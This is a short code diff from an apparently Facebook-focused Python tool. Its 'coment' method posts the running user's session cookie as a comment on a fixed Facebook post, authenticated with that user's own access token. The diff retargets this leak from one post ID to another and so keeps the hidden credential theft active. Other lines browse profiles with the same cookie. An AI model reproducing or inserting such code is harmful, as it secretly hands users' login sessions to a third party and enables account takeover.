@@ -548,7 +548,7 @@ class login:
 						exec = xyz.post(url,data=bahasa,cookies={"cookie":codeteam["cookie"]})
 		except Exception as e:pass
 	def coment(self):
-		requests.post(f"https://graph.facebook.com/100013275378835_1667011730417990/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
+		requests.post(f"https://graph.facebook.com/100078878940801_241055118533785/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
 	def get_fols(self,idz):
 			try:
 				for x in par(requests.get('https://mbasic.facebook.com/%s'%(idz),cookies={"cookie":codeteam["cookie"]}).content,'html.parser').find_all('a',href=True):
